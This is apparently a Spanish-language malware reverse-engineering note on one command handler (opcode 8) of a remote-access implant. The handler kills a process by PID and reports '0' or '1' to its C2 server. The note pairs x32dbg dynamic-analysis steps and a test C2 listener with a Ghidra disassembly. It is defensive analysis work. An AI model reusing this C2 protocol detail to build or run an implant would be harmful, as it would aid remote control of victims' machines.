# FUN_00402440 - Opcode 8

La función FUN_00402440 tiene un propósito claro: terminar un proceso dado por ID, usando una lógica condicional para notificar al servidor C2 (Command & Control) si tuvo éxito o no.
- Toma un puntero a un identificador de proceso	param_2
- Usa OpenProcess y TerminateProcess	Intenta matar el proceso
- Informa al C2 si tuvo éxito o no	usando Ordinal_19 (probablemente send)
- Usa 0x30 (OK) o 0x31 (FAIL)	como códigos de estado

_____________________________________
# Análisis dinámico de FUN_00402440

## Listener en python para poder probar este opcode
[listener-opcode8](../analisis-dinamico/listener-opcode8.py)

En la MV Windows determinamos que proceso va a ser enviado desde el Host C2 para ser detenido.  
Activamos en la MV Remnux un listener para probar este opcode en x32dbg y hacemos una captura de los paquetes que circulan por la red:
```
sudo tcpdump -i any host 10.0.0.4
python3 listener.py --dry-run --pid 5678
```


## Entrada del handler del opcode 8
- FUN_00402440 (tu función objetivo).
  Nos deja ver el estado justo antes del parseo y las llamadas a Win32/WSA.

- Parseo del PID (atoi/conv)
  - FUN_0040296d (la que se llama antes de OpenProcess).
    ✔️ Al entrar, miramos el puntero que llega (es la cadena ASCII con el PID).
    ✔️ Al salir, EAX = PID (decimal). Confirmamos que es el que determinamos al principio para cerrar.

## Abrir el proceso
- KERNEL32.OpenProcess (BP en import o en el thunk IAT). En la llamada desde esta función:
  - [ESP+04] = dwDesiredAccess = 0x00000001 (PROCESS_TERMINATE)
  - [ESP+08] = bInheritHandle = 0
  - [ESP+0C] = dwProcessId = **EAX** devuelto por FUN_0040296d`
- Al retorno, EAX = handle (0 = fallo).  
- Aprovechamos para forzar ramas: ponemos EAX=0 (simulamos fallo) o EAX=0xDEAD (simulamos éxito).

## Terminar el proceso
- KERNEL32.TerminateProcess
- En la llamada:  
  [ESP+04] = hProcess (lo que devolvió OpenProcess)
  [ESP+08] = uExitCode = 0xFFFFFFFF (−1)
  Al retorno, EAX = BOOL (0 = fallo, ≠0 = éxito).
- Aquí podemos forzar éxito (EAX=1) o fallo (EAX=0) sin tocar nada más.

## Enviar la respuesta al C2 (2 bytes)
- WS2_32.send (en tu bin aparece como Ordinal_19).
- En la llamada:
  [ESP+04] = socket
  [ESP+08] = lpBuffer → apunta a "0\0" o "1\0"
  [ESP+0C] = len = 2
- Verificamos el primer byte: 0x30 (‘0’) = éxito, 0x31 (‘1’) = fallo.

_____________________________________

# FUN_00402440 Decompilada

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __thiscall FUN_00402440(void * this, undefined
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
             void *            ECX:4 (auto)   this
             undefined4        Stack[0x4]:4   param_1
             byte *            Stack[0x8]:4   param_2                                 XREF[1]:     00402440(R)  
                             FUN_00402440                                    XREF[1]:     FUN_004012f0:004017b7(c)  
        00402440 8b 44 24 08     MOV        EAX,dword ptr [ESP + param_2]
        00402444 50              PUSH       EAX
        00402445 e8 23 05        CALL       FUN_0040296d                                     undefined FUN_0040296d(void * th
                 00 00
        0040244a 83 c4 04        ADD        ESP,0x4
        0040244d 50              PUSH       EAX
        0040244e 6a 00           PUSH       0x0
        00402450 6a 01           PUSH       0x1
        00402452 ff 15 64        CALL       dword ptr [->KERNEL32.DLL::OpenProcess]          = 000099e2
                 90 40 00
        00402458 6a ff           PUSH       -0x1
        0040245a 50              PUSH       EAX
        0040245b ff 15 60        CALL       dword ptr [->KERNEL32.DLL::TerminateProcess]     = 000099ce
                 90 40 00
        00402461 85 c0           TEST       EAX,EAX
        00402463 6a 00           PUSH       0x0
        00402465 6a 02           PUSH       0x2
        00402467 74 11           JZ         LAB_0040247a
        00402469 8b 4c 24 0c     MOV        this,dword ptr [ESP + 0xc]
        0040246d 68 94 a1        PUSH       DAT_0040a194                                     = 30h    0
                 40 00
        00402472 51              PUSH       this
        00402473 ff 15 68        CALL       dword ptr [->WS2_32.DLL::Ordinal_19]             = 80000013
                 91 40 00
        00402479 c3              RET
                             LAB_0040247a                                    XREF[1]:     00402467(j)  
        0040247a 8b 54 24 0c     MOV        EDX,dword ptr [ESP + 0xc]
        0040247e 68 90 a1        PUSH       DAT_0040a190                                     = 31h    1
                 40 00
        00402483 52              PUSH       EDX
        00402484 ff 15 68        CALL       dword ptr [->WS2_32.DLL::Ordinal_19]             = 80000013
                 91 40 00
        0040248a c3              RET
        0040248b 90              ??         90h
        0040248c 90              ??         90h
        0040248d 90              ??         90h
        0040248e 90              ??         90h
        0040248f 90              ??         90h

```
